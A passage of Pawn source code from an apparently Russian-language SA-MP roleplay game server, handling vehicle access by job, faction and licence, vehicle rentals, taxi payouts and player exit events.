				TogglePlayerControllable(playerid, 0);
				if(PlayerInfo[playerid][pJob] == 99)
				{
				}
				else
				{
					SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Дальнобойщик");
					RemovePlayerFromVehicleAC(playerid);
					TogglePlayerControllable(playerid, 1);
				}
			}
		}
		if(newcar >= hotdogcar[0] && newcar <= hotdogcar[1])
		{
			if(PlayerInfo[playerid][pJob] != 3)
			{
				SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Продавец хот-догов");
				RemovePlayerFromVehicleAC(playerid);
				return true;
			}
			if(GetPVarInt(playerid, "rentcar_job") == GetPlayerVehicleID(playerid)) SCM(playerid,COLOR_GREEN,"Заключите контракт с закусочной, для торговли едой. (( Подъедьте к закусочной и введите: /hcontract ))");
			else ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
		}
		if((newcar >= buscar[0] && newcar <= buscar[1]) || (newcar >= buscar[2] && newcar <= buscar[3]) || (newcar >= buscar[4] && newcar <= buscar[5]) || (newcar >= buscar[6] && newcar <= buscar[7]))
		{
			if(PlayerInfo[playerid][pJob] != 1)
			{
				SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Водитель автобуса");
				RemovePlayerFromVehicleAC(playerid);
				return true;
			}
			if(GetPVarInt(playerid, "BusTime") > 0 && GetPVarInt(playerid, "rentcar_job") == GetPlayerVehicleID(playerid))
			{
				new i = pPressed[playerid], type = GetPVarInt(playerid, "TypeBus"),name[64];
				switch(type)
				{
				case 1: name = "ВнутриГородской ЛС";
				case 2: name = "ВнутриГородской СФ";
				case 3: name = "ВнутриГородской ЛВ";
				case 4: name = "АвтоВокзал LS << >> Автошкола SF";
				case 5: name = "АвтоВокзал LS << >> АвтоВокзал LV";
				case 6: name = "АвтоВокзал LS << >> Заводы";
				}
				format(string, 90, "%s\n<< Проезд бесплатный >>", name);
				Attach3DTextLabelToVehicle(JobText3D[newcar], GetPlayerVehicleID(playerid), 0.0, 0.0, 2.25);
				if(type == 1) SetPlayerRaceCheckpoint(playerid,0,BusCityLS[i][0],BusCityLS[i][1],BusCityLS[i][2],BusCityLS[i][3],BusCityLS[i][4],BusCityLS[i][5],7.0);
				if(type == 2) SetPlayerRaceCheckpoint(playerid,0,BusCitySF[i][0],BusCitySF[i][1],BusCitySF[i][2],BusCitySF[i][3],BusCitySF[i][4],BusCitySF[i][5],7.0);
				if(type == 3) SetPlayerRaceCheckpoint(playerid,0,BusCityLV[i][0],BusCityLV[i][1],BusCityLV[i][2],BusCityLV[i][3],BusCityLV[i][4],BusCityLV[i][5],7.0);
				if(type == 4) SetPlayerRaceCheckpoint(playerid,0,BusSchool[i][0],BusSchool[i][1],BusSchool[i][2],BusSchool[i][3],BusSchool[i][4],BusSchool[i][5],7.0);
				if(type == 5) SetPlayerRaceCheckpoint(playerid,0,BusLSLV[i][0],BusLSLV[i][1],BusLSLV[i][2],BusLSLV[i][3],BusLSLV[i][4],BusLSLV[i][5],5.0);
				if(type == 6) SetPlayerRaceCheckpoint(playerid,0,BusLSZavodi[i][0],BusLSZavodi[i][1],BusLSZavodi[i][2],BusLSZavodi[i][3],BusLSZavodi[i][4],BusLSZavodi[i][5],5.0);
				DeletePVar(playerid, "BusTime");
			}
			if(GetPVarInt(playerid, "rentcar_job") == GetPlayerVehicleID(playerid)) { }
			else ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
		}
		if(newcar >= taxicar[0] && newcar <= taxicar[68])
		{
			if(PlayerInfo[playerid][pJob] == 4 && PlayerInfo[playerid][pMember] == 0)
			{
				if(GetPVarInt(playerid,"rentcar_job") != newcar)
				{
					ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
				}
			}
			else
			{
				SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Таксист");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= taxi5lvlcar[0] && newcar <= taxi5lvlcar[9])
		{
			if(PlayerInfo[playerid][pJob] == 4 && PlayerInfo[playerid][pMember] == 0 && PlayerInfo[playerid][ptaxilvl] >= 5)
			{
				if(GetPVarInt(playerid,"rentcar_job") != newcar)
				{
					ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
				}
			}
			else
			{
	  			if(PlayerInfo[playerid][pJob] != 4)
				{
					SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Таксист");
					RemovePlayerFromVehicleAC(playerid);
				}
	  			else if(PlayerInfo[playerid][ptaxilvl] <= 5)
				{
					SCM(playerid, COLOR_GREY, " Для этого транспорта требуется 5 уровень скилла");
					RemovePlayerFromVehicleAC(playerid);
				}
			}
		}
		if(newcar >= taxi10lvlcar[0] && newcar <= taxi10lvlcar[10])
		{
			if(PlayerInfo[playerid][pJob] == 4 && PlayerInfo[playerid][pMember] == 0 && PlayerInfo[playerid][ptaxilvl] >= 10)
			{
				if(GetPVarInt(playerid,"rentcar_job") != newcar)
				{
					ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
				}
			}
			else
			{
	  			if(PlayerInfo[playerid][pJob] != 4)
				{
					SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Таксист");
					RemovePlayerFromVehicleAC(playerid);
				}
	  			else if(PlayerInfo[playerid][ptaxilvl] <= 10)
				{
					SCM(playerid, COLOR_GREY, " Для этого транспорта требуется 10 уровень скилла");
					RemovePlayerFromVehicleAC(playerid);
				}
			}
		}
		if(newcar >= taxi40lvlcar[0] && newcar <= taxi40lvlcar[6])
		{
			if(PlayerInfo[playerid][pJob] == 4 && PlayerInfo[playerid][pMember] == 0 && PlayerInfo[playerid][ptaxilvl] >= 40)
			{
				if(GetPVarInt(playerid,"rentcar_job") != newcar)
				{
					ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
				}
			}
			else
			{
	  			if(PlayerInfo[playerid][pJob] != 4)
				{
					SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Таксист");
					RemovePlayerFromVehicleAC(playerid);
				}
	  			else if(PlayerInfo[playerid][ptaxilvl] <= 40)
				{
					SCM(playerid, COLOR_GREY, " Для этого транспорта требуется 40 уровень скилла");
					RemovePlayerFromVehicleAC(playerid);
				}
			}
		}
		if(IsABoat(newcar))
		{
			if(PlayerInfo[playerid][pBoatLic] < 1)
			{
				SCM(playerid, COLOR_GREY, " У вас нет лицензии. Вы не можете управлять данным транспортом");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(IsAPlane(newcar))
		{
			if(PlayerInfo[playerid][pFlyLic] < 1)
			{
				if(TakingLesson[playerid] == 1) { }
				else {
					SCM(playerid, COLOR_GREY, " У вас нет лицензии. Вы не можете управлять данным транспортом");
					RemovePlayerFromVehicleAC(playerid); }
			}
		}
		if(CarLic(newcar))
		{
			if(PlayerInfo[playerid][pCarLic] == 0)
			{
				if(TakingLesson[playerid] != 1)
				{
					SCM(playerid, COLOR_GREY, " У вас нет лицензии. Вы не можете управлять данным транспортом");
					RemovePlayerFromVehicleAC(playerid);
				}
			}
		}
		if(newcar >= lsnewscar[0] && newcar <= lsnewscar[5])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 16) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не работник LS News!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= lvpdcar[0] && newcar <= lvpdcar[20])
		{
			if(!GetPVarInt(playerid,"Fraction_Duty") || PlayerInfo[playerid][pMember] != 21)
			{
				SCM(playerid, COLOR_GREY, " Транспорт принадлежит LVPD");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= hamccar[0] && newcar <= hamccar[10])
		{
			if(PlayerInfo[playerid][pLeader] == 24 || PlayerInfo[playerid][pMember] == 24) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Транспорт принадлежит Hell's Angels MC");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= wmccar[0] && newcar <= wmccar[10])
		{
			if(PlayerInfo[playerid][pLeader] == 26 || PlayerInfo[playerid][pMember] == 26) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Транспорт принадлежит Warlocks MC");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= pmccar[0] && newcar <= pmccar[10])
		{
			if(PlayerInfo[playerid][pLeader] == 29 || PlayerInfo[playerid][pMember] == 29) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Транспорт принадлежитPagans MC");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= ruscar[0] && newcar <= ruscar[14])
		{
			if(PlayerInfo[playerid][pLeader] == 14 || PlayerInfo[playerid][pMember] == 14) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член Русской мафии!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= lvnewscar[0] && newcar <= lvnewscar[7])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 20) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не работник LV News!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= lcncar[0] && newcar <= lcncar[14])
		{
			if(PlayerInfo[playerid][pLeader] == 5 || PlayerInfo[playerid][pMember] == 5) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член La Cosa Nostra!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= yakcar[0] && newcar <= yakcar[12])
		{
			if(PlayerInfo[playerid][pLeader] == 6 || PlayerInfo[playerid][pMember] == 6) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член Yakuza!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= cnncar[0] && newcar <= cnncar[4] || newcar == cnnmav)
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 9) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член SF News!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= comptruck[0] && newcar <= comptruck[1])
		{
			if(PlayerInfo[playerid][pJob] == 5)
			{
				if(GetPVarInt(playerid,"rentcar_job") != newcar) ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
				else
				{
					if(car_pickup[newcar] > 0) {
						format(YCMDstr, 124, "{FFFFFF}Загружено: {0C9599}%i\n{FFFFFF}Общая стоимость: {0C9599}%i\n\n{B41010}Вы желаете завершить загрузку зерна?", car_grain[GetPlayerVehicleID(playerid)][0]-car_grain[GetPlayerVehicleID(playerid)][2], (car_grain[GetPlayerVehicleID(playerid)][0]-car_grain[GetPlayerVehicleID(playerid)][2])*ZernBuy);
						ShowPlayerDialogEx(playerid,1346,DIALOG_STYLE_MSGBOX, " ", YCMDstr, "Да", "Нет"); }
					else
					{
						SendMes(playerid,TEAM_GROVE_COLOR," Зерна в машине: %i / 1000",car_grain[GetPlayerVehicleID(playerid)][0]);
						SendMes(playerid,TEAM_GROVE_COLOR," Урожая в машине: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][0]);
						SendMes(playerid,TEAM_GROVE_COLOR," Наркотиков в машине: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][1]);
					}
				}
				//SCM(playerid, -1, "Для загрузки продуктов, Введите: /load ");
			}
			else
			{
				SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Развозчик продуктов");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= comptruck[2] && newcar <= comptruck[3])
		{
			if(PlayerInfo[playerid][pJob] != 5) return SCM(playerid,COLOR_GREY," Транспорт недоступен! Вы должны устроиться на работу: Развозчик продуктов"), RemovePlayerFromVehicleAC(playerid);
			if(GetPVarInt(playerid,"rentcar_job") != newcar) ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
		}
		if(newcar >= comptruck[4] && newcar <= comptruck[5])
		{
			if(PlayerInfo[playerid][pJob] != 5) return SCM(playerid,COLOR_GREY," Транспорт недоступен! Вы должны устроиться на работу: Развозчик продуктов"), RemovePlayerFromVehicleAC(playerid);
			if(GetPVarInt(playerid,"rentcar_job") != newcar) ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
		}
		if(newcar >= comptruck[6] && newcar <= comptruck[7])
		{
			if(PlayerInfo[playerid][pPSkill] < 4) return SCM(playerid,-1," Автомобиль доступен с 4 уровня развозчика"), RemovePlayerFromVehicleAC(playerid);
			if(PlayerInfo[playerid][pJob] != 5) return SCM(playerid,COLOR_GREY," Транспорт недоступен! Вы должны устроиться на работу: Развозчик продуктов"), RemovePlayerFromVehicleAC(playerid);
			if(GetPVarInt(playerid,"rentcar_job") != newcar) ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
		}
		if(newcar >= comptruck[8] && newcar <= comptruck[9])
		{
			if(PlayerInfo[playerid][pPSkill] < 8) return SCM(playerid,-1," Автомобиль доступен с 8 уровня развозчика"), RemovePlayerFromVehicleAC(playerid);
			if(PlayerInfo[playerid][pJob] != 5) return SCM(playerid,COLOR_GREY," Транспорт недоступен! Вы должны устроиться на работу: Развозчик продуктов"), RemovePlayerFromVehicleAC(playerid);
			if(GetPVarInt(playerid,"rentcar_job") != newcar) ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
		}
		if(newcar >= govcar[0] && newcar <= govcar[7])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 7) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Транспорт принадлежит Мэрии!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= matsfura[0] && newcar <= matsfura[0])
		{
			if(PlayerInfo[playerid][pLeader] == 12 || PlayerInfo[playerid][pMember] == 12) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член The Ballas Gang!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= fbicar[0] && newcar <= fbicar[16])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 2) { }
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит FBI");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= sapdcar[0] && newcar <= sapdcar[15])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 1) { }
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит LSPD");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= medicsls[0] && newcar <= medicsls[9])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 4) { }
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит МЧС");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= medicsfc[0] && newcar <= medicsfc[7])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 4) { }
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит МЧС");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= medicsls1[0] && newcar <= medicsls1[0])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 4) { }
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит МЧС");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= medicslv[0] && newcar <= medicslv[8])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 4) { }
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит МЧС");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= medicssf[0] && newcar <= medicssf[13])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 4) { }
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит МЧС");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= medicssf1[0] && newcar <= medicssf1[5])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 4) { }
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит МЧС");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= mehanik[0] && newcar <= mehanik[12])
		{
			if(PlayerInfo[playerid][pJob] == 2 && PlayerInfo[playerid][pMember] == 0)
			{
				if(GetPVarInt(playerid,"rentcar_job") != newcar)
				{
					ShowPlayerDialogEx(playerid,9128,DIALOG_STYLE_MSGBOX, "Аренда транспорта", "Стоимость аренды: {FFFF00}500 вирт", "Оплатить", "Отмена");
				}
			}
			else
			{
				SCM(playerid, COLOR_GREY, " Транспорт недоступен! Вы должны устроиться на работу: Механик");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= sfpdcar[0] && newcar <= sfpdcar[15])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 10) { }
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит SFPD");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= matsfuragrove[0] && newcar <= matsfuragrove[0])
		{
			if(PlayerInfo[playerid][pLeader] == 15 || PlayerInfo[playerid][pMember] == 15) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член Grove street!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= matsfuraactek[0] && newcar <= matsfuraactek[0])
		{
			if(PlayerInfo[playerid][pLeader] == 17 || PlayerInfo[playerid][pMember] == 17) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член Varios Los Aztecas!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= matsfuravagos[0] && newcar <= matsfuravagos[0])
		{
			if(PlayerInfo[playerid][pLeader] == 13 || PlayerInfo[playerid][pMember] == 13) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член Vagos!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= matsfurarifa[0] && newcar <= matsfurarifa[0])
		{
			if(PlayerInfo[playerid][pLeader] == 18 || PlayerInfo[playerid][pMember] == 18) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член Rifa!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= ballascar[0] && newcar <= ballascar[6])
		{
			if(PlayerInfo[playerid][pLeader] == 12 || PlayerInfo[playerid][pMember] == 12) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член Ballas!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= grovecar[0] && newcar <= grovecar[6])
		{
			if(PlayerInfo[playerid][pLeader] == 15 || PlayerInfo[playerid][pMember] == 15) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член Grove street!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= coronoscar[0] && newcar <= coronoscar[6])
		{
			if(PlayerInfo[playerid][pLeader] == 17 || PlayerInfo[playerid][pMember] == 17) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член Varios Los Aztecas!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= vagoscar[0] && newcar <= vagoscar[6])
		{
			if(PlayerInfo[playerid][pLeader] == 13 || PlayerInfo[playerid][pMember] == 13) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член Vagos!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= rifacar[0] && newcar <= rifacar[6])
		{
			if(PlayerInfo[playerid][pLeader] == 18 || PlayerInfo[playerid][pMember] == 18) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Вы не член Rifa!");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= gunscar[0] && newcar <= gunscar[6])
		{
			if (GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 19 || proverkaforma[playerid] == 1) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Транспорт принадлежит ARMY LV");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= lsacar[0] && newcar <= lsacar[15])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 3 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 19 || proverkaforma[playerid] == 1) { }
			else
			{
				SCM(playerid, COLOR_GREY, " Транспорт принадлежит военным");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(PlayerInfo[playerid][pMember] == 24 && newcar == hamccar[10])
		{
		    SendMes(playerid,COLOR_GREEN," Груза в фургоне: %i / 10000",vertmatbilsa[hamccar[10]][0]);
		}
		else if(PlayerInfo[playerid][pMember] == 26 && newcar == wmccar[10])
		{
		    SendMes(playerid,COLOR_GREEN," Груза в фургоне: %i / 10000",vertmatbilsa[wmccar[10]][0]);
		}
		else if(PlayerInfo[playerid][pMember] == 26 && newcar == pmccar[10])
		{
		    SendMes(playerid,COLOR_GREEN," Груза в фургоне: %i / 10000",vertmatbilsa[pmccar[10]][0]);
		}
		if(newcar >= lsacarvert[0] && newcar <= lsacarvert[0])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 3 || GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 19 || proverkaforma[playerid] == 1)
			{
				if(VertMatslsa[playerid] == 0) SetPlayerCheckpoint(playerid,-1468.2487,1488.6337,9.8943,14.0);
				SendMes(playerid,TEAM_GROVE_COLOR," Материалов: %i / 30000",vertmatbilsa[GetPlayerVehicleID(playerid)][0]);
				if(VertMatslsa[playerid] == 0) SCM(playerid,COLOR_GREEN, " Миссия по доставке материалов начата, место загрузки / разгрузки помечено на карте");
				if(VertMatslsa[playerid] == 0) VertMatslsa[playerid] = 1;
				lsacarvertexit[playerid] = 1;
			}
			else
			{
				SCM(playerid, COLOR_GREY, " Транспорт принадлежит военным");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= armycarsf[0] && newcar <= armycarsf[23])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 3 || proverkaforma[playerid] == 1) { }
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит ARMY SF");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= armycarsf[24] && newcar <= armycarsf[28])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 3 || proverkaforma[playerid] == 1)
			{
				if(VertMats[playerid] == 0) SetPlayerCheckpoint(playerid,-1468.2487,1488.6337,9.8943,14.0);
				VertMats[playerid] = 1;
				SendMes(playerid,TEAM_GROVE_COLOR," Материалов: %i / 30000",vertmatbi[GetPlayerVehicleID(playerid)][0]);
				if(VertMats[playerid] == 0) SCM(playerid,COLOR_GREEN, " Миссия по доставке материалов начата, место загрузки / разгрузки помечено на карте");
				return true;
			}
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит ARMY SF");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
		if(newcar >= armcar[0] && newcar <= armcar[26])
		{
			if(GetPVarInt(playerid,"Fraction_Duty") && PlayerInfo[playerid][pMember] == 19 || proverkaforma[playerid] == 1) { }
			else
			{
				SCM(playerid, COLOR_GRAD1, " Транспорт принадлежит ARMY LV");
				RemovePlayerFromVehicleAC(playerid);
			}
		}
	}
	return true;
}
stock LockCar(playerid,carid)
{
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(!IsAPlane(carid) && !IsABoat(carid) && !IsABike(carid) && AutoSaloon[playerid] != true)
		{
			PlayerTextDrawColor(playerid,StatusShow[playerid], -16776961);
			PlayerTextDrawSetString(playerid,StatusShow[playerid],"Lock");
			PlayerTextDrawShow(playerid,StatusShow[playerid]);
		}
	}
	GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
	return SetVehicleParamsEx(carid,engine,lights,alarm,true,bonnet,boot,objective);
}
public OnPlayerExitVehicle(playerid, vehicleid)
{
	if(SERVERTEST) SendMes(playerid,COLOR_BLUE,"EXITVEHICLE: PLAYERID - %i, VEHICLEID - %i",playerid,vehicleid);
	SetPVarInt(playerid,"AFK_Time",0);
	SetPVarInt(playerid, "GunCheckTime", 2);
	car_ex[vehicleid] = true;
	GetVehiclePos(vehicleid,car_coord[vehicleid][0],car_coord[vehicleid][1],car_coord[vehicleid][2]);
	GetVehicleZAngle(vehicleid,car_coord[vehicleid][3]);
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && GetPVarInt(playerid,"TaxiDuty"))
	{
		Delete3DTextLabel(JobText3D[GetPVarInt(playerid,"rentcar_job")]);
		DeletePVar(playerid,"TaxiDuty");
	}
	if(race_info[1] > 1 && GetPVarInt(playerid,"gonka") != 0)
	{
		SetPlayerInterior(playerid,3);
		SetPlayerPos(playerid,831.7769,6.8750,1004.1797);
		SetPlayerFacingAngle(playerid,108.1610);
		DestroyVehicle(RaceInfo[GetPVarInt(playerid,"gonka")-1][rCar]);
		DeletePVar(playerid,"gonka");
		SCM(playerid,COLOR_LIGHTRED,"Вы были дисквалифицированы!");
	}
	if(GetPlayerState(playerid) == PLAYER_STATE_PASSENGER)
	{
		foreach(i)
		{
			if(IsPlayerInVehicle(i, GetPlayerVehicleID(playerid)) && GetPlayerState(i) == 2 && GetPVarInt(i,"TaxiDuty") > 0)
			{
				if(GetPVarInt(i,"Taxi_")-1 == playerid)
				{
					SCM(i, COLOR_BLUE, " Пассажир вышел из вашего Такси. Деньги будут зачислены во время зарплаты");
					if(GetPVarInt(i,"PayDayCashJob") > gettime()) {}
					else
					{
						new taxizp = 200+random(200);
						PlayerInfo[i][pPayCheck] += taxizp*PlayerInfo[i][ptaxilvl];
						if(PlayerInfo[i][pPayCheck] > 4000+(PlayerInfo[i][ptaxilvl]*1000)) PlayerInfo[i][pPayCheck] = 4000+(PlayerInfo[i][ptaxilvl]*1000);
					}
					SetPVarInt(playerid, "TaxiPlayer", i);
					ShowPlayerDialogEx(GetPVarInt(i,"Taxi_")-1, 1203, DIALOG_STYLE_MSGBOX, "Такси", "Как вас обслужили?", "Хорошо", "Плохо");
					DeletePVar(i,"Taxi_");
					for(new id; id < GetMaxPlayers(); id++)
					{
						if(IsPlayerInVehicle(id, GetPlayerVehicleID(playerid)) && id != i && id != playerid)
						{
							format(string, 128, " Довезите пассажира %s и государство заплатит вам",PlayerInfo[id][pName]);
							SCM(i, COLOR_BLUE, string);
							SetPVarInt(i,"Taxi_",id+1);
							break;
						}
					}
				}
			}
		}
	}
	if(rabotaon[playerid] == 1) DisablePlayerCheckpoint(playerid);
	if(PEfir[playerid] != 255)
	{
		format(string, 90, " Вы вышли из прямого эфира");
		SCM(playerid, -1, string);
		PEfir[playerid] = 255;
	}
	if(Pefir[playerid] == 1 || Pefir[playerid] == 2)
	{
		PEfir[playerid] = 255;
		format(string, 90, " Вы вышли из прямого эфира");
		SCM(playerid, -1, string);
	}
	DeletePVar(playerid, "EnterVehTime");
	return true;
}
public OnPlayerRequestClass(playerid, classid)
{
    ac_TogglePlayerSpectating(playerid, 1);
	if(GetPVarInt(playerid, "start_menu")) return true;
	if(SERVERTEST) SendMes(playerid,COLOR_BLUE,"REQUEST: PLAYERID - %i, CLASSID - %i",playerid,classid);
	if(PlayerInfo[playerid][pLogin] == 1)
	{
		SCM(playerid, -1, " Сменить скин можно в магазинах 'Victim'. (( Используйте: /gps >> [3] Магазины ))");
		return SpawnPlayer(playerid);
	}
	//==========================================================================
	ResetNew(playerid);
	LoadRecon(playerid);
	CreateTextDraws(playerid);
	CaptureTextDraws(playerid);
	ShopText[playerid] = CreatePlayerTextDraw(playerid,509.000000,180.000000,"Model: Landstalker");
	PlayerTextDrawBackgroundColor(playerid,ShopText[playerid],255);
	PlayerTextDrawFont(playerid,ShopText[playerid],1);
	PlayerTextDrawSetOutline(playerid,ShopText[playerid],1);
	PlayerTextDrawSetShadow(playerid,ShopText[playerid],0);
	PlayerTextDrawLetterSize(playerid,ShopText[playerid],0.270000,1.200000);
	PlayerTextDrawColor(playerid,ShopText[playerid],-1);
	PlayerTextDrawSetProportional(playerid,ShopText[playerid],1);
	new ip[2][16],x;
	GetPlayerIp(playerid,ip[0],16);
	foreach(i)
